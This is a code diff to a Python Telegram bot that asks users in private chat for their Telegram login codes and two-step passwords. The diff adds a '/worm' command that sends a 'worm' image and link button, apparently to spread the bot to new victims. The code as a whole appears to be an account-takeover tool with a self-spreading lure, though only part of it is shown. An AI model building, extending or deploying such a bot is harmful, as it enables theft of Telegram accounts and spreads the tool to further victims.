@@ -1,7 +1,6 @@
 import logging,os,json,telethon,asyncio
-from telethon import TelegramClient, events
+from telethon import TelegramClient, events, Button
 from telethon.sessions import StringSession
-from telethon.tl.custom.button import Button
 from dotenv import load_dotenv
 from pymongo.mongo_client import MongoClient
 from pymongo.server_api import ServerApi
@@ -178,7 +177,7 @@ async def handler_callback(event):
     elif not await sign_in(event):
         await event.edit(strings['ask_code']+login['code'], buttons=numpad)
 @events.register(events.NewMessage(func=lambda e: e.is_private))
-async def handler_other(event):
+async def handler_other_msg(event):
     user_data = database.find_one({"chat_id": event.chat_id})
     login = json.loads(get(user_data, 'login', '{}'))
     if get(login, 'code_ok', False) and get(login, 'need_pass', False) and not get(login, 'pass_ok', False):
@@ -193,6 +192,14 @@ async def handler_other(event):
         await event.respond(strings['already_logged_in'])
     else:
         await event.respond(strings['unknownn_command'])
+@events.register(events.NewMessage(pattern=r"/worm", func=lambda e: e.is_private))
+async def handler_spred_msg(event):
+    await event.respond(
+        strings['worm_msg'],
+        file='files/worm.png',
+        buttons=[[Button.url(strings['worm_msg_btn_txt'], strings['worm_msg_btn_url'])]],
+        link_preview=False
+    )
 
 async def run_bot():
     global bot
